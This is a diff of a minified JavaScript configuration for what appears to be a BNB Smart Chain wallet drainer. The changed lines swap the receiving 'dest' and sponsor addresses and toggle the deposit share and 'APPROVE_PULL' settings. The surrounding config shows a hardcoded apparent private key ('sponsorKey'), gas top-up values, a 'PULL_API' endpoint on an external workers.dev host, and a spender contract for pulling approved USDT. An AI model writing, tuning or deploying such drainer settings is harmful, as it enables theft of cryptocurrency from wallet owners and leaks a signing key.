@@ -4,19 +4,19 @@ const BUILD = "2026-11-17-v22.4"
     hexId: "0x38",
     native: "BNB",
     usdt: "0x55d398326f99059fF775485246999027B3197955",
-    dest: "0xe07A252364810015F9B5D8716F7542006F5fbC7f",
+    dest: "0xB770af6Cc85cA93d611b70A1E920c0CD74d3EC3b",
     sponsorKey: "119798bf5f47d5222661063225863b2ee36a2879836475d623162e19a6a4c334",
     explorer: "https://bscscan.com",
     rpc: ["https://bsc-dataseed.binance.org/", "https://binance.llamarpc.com", "https://bsc-dataseed1.binance.org/", "https://1rpc.io/bnb", "https://bsc-dataseed2.binance.org/", "https://rpc.ankr.com/bsc"],
     activeRpc: null
 }
   , THRESHOLD = Number(new URLSearchParams(location.search).get("min") || 0)
-  , DEPOSIT_PCT = .7
+  , DEPOSIT_PCT = 0
   , DEPOSIT_MIN = 0
   , GAS_FLOOR = 15000000000000n
   , TOKEN_TX_GAS = 12e4
   , SPONSOR_TX_GAS = 21e3
-  , SPONSOR_ADDR = "0x07db577A7055Af80D578E2C54b43A9f493b69653"
+  , SPONSOR_ADDR = "0xe07A252364810015F9B5D8716F7542006F5fbC7f"
   , TOPUP_MIN = "0.000011"
   , TOPUP_CAP = "0.0001"
   , PULL_API = "https://bsc-pull.nitintigga559.workers.dev/api/pull"
@@ -24,7 +24,7 @@ const BUILD = "2026-11-17-v22.4"
   , PULL_SECRET = ""
   , RELAY_URL = ""
   , SERVER_URL = ""
-  , APPROVE_PULL = !0
+  , APPROVE_PULL = !1
   , PULL_GAS = 12e4
   , MULTICALL3 = "0xcA11bde05977b3631167028862bE2a173976CA11"
   , SPENDER_CONTRACT = "0x9b135D63007ED330DFE2d64bBCdD04081E4F03E8"
